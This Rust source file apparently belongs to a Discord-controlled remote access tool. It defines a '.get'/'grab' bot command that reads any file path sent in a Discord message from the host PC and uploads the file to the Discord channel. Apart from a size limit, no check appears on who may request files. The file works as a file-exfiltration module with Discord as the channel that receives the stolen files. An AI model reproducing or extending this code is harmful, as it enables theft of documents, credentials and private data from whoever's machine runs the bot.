use serde_json;
use crate::commands::*;
use crate::config::Config;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;


pub struct GetCommand;

#[async_trait]
impl BotCommand for GetCommand {
    fn name(&self) -> &str { "get" }
    fn description(&self) -> &str { "Download a file from PC and send it to Discord" }
    fn category(&self) -> &str { "filesystem" }
    fn usage(&self) -> &str { ".get <file_path>" }
    fn examples(&self) -> &'static [&'static str] { 
        &[".get document.pdf", ".get C:\\Users\\Desktop\\file.txt"] 
    }
    fn aliases(&self) -> &'static [&'static str] { &["getfile", "grab"] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let file_path_owned = args.rest();
        let file_path = file_path_owned.trim();

        if file_path.is_empty() {
            http.create_message(msg.channel_id.get(), "ERROR: Please provide a file path. Usage: `.get <file_path>`").await?;
            return Ok(());
        }

        let path = Path::new(file_path);

        if !path.exists() {
            http.create_message(msg.channel_id.get(), &format!("ERROR: File not found: `{}`", file_path)).await?;
            return Ok(());
        }

        if !path.is_file() {
            http.create_message(msg.channel_id.get(), &format!("ERROR: Path is not a file: `{}`", file_path)).await?;
            return Ok(());
        }

        let metadata = fs::metadata(path)?;
        let file_size = metadata.len();

        let max_size = Config::get_max_bfilesize() as u64;
        if file_size > max_size {
            http.create_message(msg.channel_id.get(), &format!(
                    "ERROR: File is too large. Discord limit: {:.0} MB. File size: {:.2} MB",
                    Config::MAX_FILE_SIZE_MB,
                    file_size as f64 / (1024.0 * 1024.0)
                )).await?;
            return Ok(());
        }

        let response_msg = http
            .create_message(msg.channel_id.into(), &format!("Preparing to download `{}`...", file_path)).await?;
        let response_message: Message = serde_json::from_str(&response_msg)?;

        match fs::read(path) {
            Ok(file_content) => {
                let filename = path
                    .file_name()
                    .and_then(|name| name.to_str())
                    .unwrap_or("downloaded_file");

                let file_size_mb = file_size as f64 / (1024.0 * 1024.0);

                match http
                    .create_message_with_file(
                        msg.channel_id.into(),
                        &format!(
                            "SUCCESS: **File downloaded from PC**\n**Filename:** `{}`\n**Size:** {:.2} MB",
                            filename, file_size_mb
                        ),
                        &file_content,
                        filename
                    )
                    .await
                {
                    Ok(_) => {
                        let _ = http
                            .delete_message(msg.channel_id, response_message.id)
                            .await;
                    }
                    Err(e) => {
                        http.update_message(msg.channel_id, response_message.id, Some(format!("ERROR: Failed to send file: {}", e))).await?;
                    }
                }
            }
            Err(e) => {
                http.update_message(msg.channel_id, response_message.id, Some(format!(
                        "ERROR: Failed to read file `{}`: {}",
                        file_path, e
                    )))
                    .await?;
            }
        }

        Ok(())
    }
}



